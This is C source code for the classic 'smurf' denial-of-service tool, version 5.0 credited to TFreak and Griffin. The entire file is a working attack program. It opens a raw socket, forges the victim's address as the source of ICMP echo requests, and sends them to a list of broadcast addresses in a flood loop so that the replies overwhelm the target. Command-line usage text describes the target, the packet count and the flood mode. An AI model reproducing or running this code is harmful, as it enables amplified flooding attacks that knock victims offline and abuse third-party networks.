b




#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

void            sm_banner(void);
void            smurf_smurf_usage(char *);
void            smurf(int, struct sockaddr_in, u_long, int);
void            sm_ctrlc(int);
unsigned int    smurf_host2ip(char *hostname);
unsigned short  in_chksum(u_short *, int);

unsigned int
smurf_host2ip(char *hostname)
{
        static struct in_addr i;
        struct hostent *h;
        i.s_addr = inet_addr(hostname);
        if (i.s_addr == -1) {
                h = gethostbyname(hostname);
                if (h == NULL) {
                        fprintf(stderr, "can't find %s\n.", hostname);
                        exit(0);
                }
                bcopy(h->h_addr, (char *) &i.s_addr, h->h_length);
        }
        return i.s_addr;
}

/* stamp */
char            id[] = "$Id smurf.c,v 5.0 1997/10/13 22:37:21 CDT griffin Exp $";

int smurf_main(int argc, char *argv[])
{
        struct sockaddr_in sin;
        FILE           *bcastfile;
        int             i, sock, bcast, delay, num, pktsize, cycle = 0,
                        x;
        char            buf[32], **bcastaddr = malloc(8192);

        sm_banner();
        signal(SIGINT, sm_ctrlc);

        if (argc < 6)
                smurf_smurf_usage(argv[0]);

        sin.sin_addr.s_addr = smurf_host2ip(argv[1]);
        sin.sin_family = AF_INET;

        num = atoi(argv[3]);
        delay = atoi(argv[4]);
        pktsize = atoi(argv[5]);

        if ((bcastfile = fopen(argv[2], "r")) == NULL) {
                perror("opening bcast file");
                exit(-1);
        }
        x = 0;
        while (!feof(bcastfile)) {
                fgets(buf, 32, bcastfile);
                if (buf[0] == '#' || buf[0] == '\n' || !isdigit(buf[0]))
                        continue;
                for (i = 0; i < strlen(buf); i++)
                        if (buf[i] == '\n')
                                buf[i] = '\0';
                bcastaddr[x] = malloc(32);
                strcpy(bcastaddr[x], buf);
                x++;
        }
        bcastaddr[x] = 0x0;
        fclose(bcastfile);

        if (x == 0) {
                fprintf(stderr, "ERROR: no broadcasts found in file %s\n\n", argv[2]);
                exit(-1);
        }
        if (pktsize > 1024) {
                fprintf(stderr, "ERROR: packet size must be < 1024\n\n");
                exit(-1);
        }
        if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("getting socket");
                exit(-1);
        }
        setsockopt(sock, SOL_SOCKET, SO_BROADCAST, (char *) &bcast, sizeof(bcast));

        printf("Flooding %s (. = 25 outgoing packets)\n", argv[1]);

        for (i = 0; i < num || !num; i++) {
                if (!(i % 25)) {
                        printf(".");
                        fflush(stdout);
                }
                smurf(sock, sin, inet_addr(bcastaddr[cycle]), pktsize);
                cycle++;
                if (bcastaddr[cycle] == 0x0)
                        cycle = 0;
                usleep(delay);
        }
        puts("\n\n");
        return 0;
}

void
sm_banner(void)
{
        puts("\nsmurf.c v5.0 by TFreak, ported by Griffin\n");
}

void
smurf_smurf_usage(char *prog)
{
        fprintf(stderr, "smurf_smurf_usage: %s <target> <bcast file> "
                "<num packets> <packet delay> <packet size>\n\n"
                "target        = address to hit\n"
                "bcast file    = file to read broadcast addresses from\n"
                "num packets   = number of packets to send (0 = flood)\n"
                "packet delay  = wait between each packet (in ms)\n"
                "packet size   = size of packet (< 1024)\n\n", prog);
        exit(-1);
}

void
smurf(int sock, struct sockaddr_in sin, u_long dest, int psize)
{
        struct ip      *ip;
        struct icmp    *icmp;
        char           *packet;
        int             hincl = 1;

        packet = malloc(sizeof(struct ip) + sizeof(struct icmp) + psize);
        ip = (struct ip *) packet;
        icmp = (struct icmp *) (packet + sizeof(struct ip));

        memset(packet, 0, sizeof(struct ip) + sizeof(struct icmp) + psize);
        setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
        ip->ip_len = sizeof(struct ip) + sizeof(struct icmp) + psize;
        ip->ip_hl = sizeof *ip >> 2;
        ip->ip_v = 4;
        ip->ip_ttl = 255;
        ip->ip_tos = 0;
        ip->ip_off = 0;
        ip->ip_id = htons(getpid());
        ip->ip_p = 1;
        ip->ip_src.s_addr = sin.sin_addr.s_addr;
        ip->ip_dst.s_addr = dest;
        ip->ip_sum = 0;
        icmp->icmp_type = 8;
        icmp->icmp_code = 0;
        icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));

        sendto(sock, packet, sizeof(struct ip) + sizeof(struct icmp) + psize,
               0, (struct sockaddr *) & sin, sizeof(struct sockaddr));

        free(packet);           /* free willy! */
}

void
sm_ctrlc(int ignored)
{
        puts("\nDone!\n");
        exit(1);
}

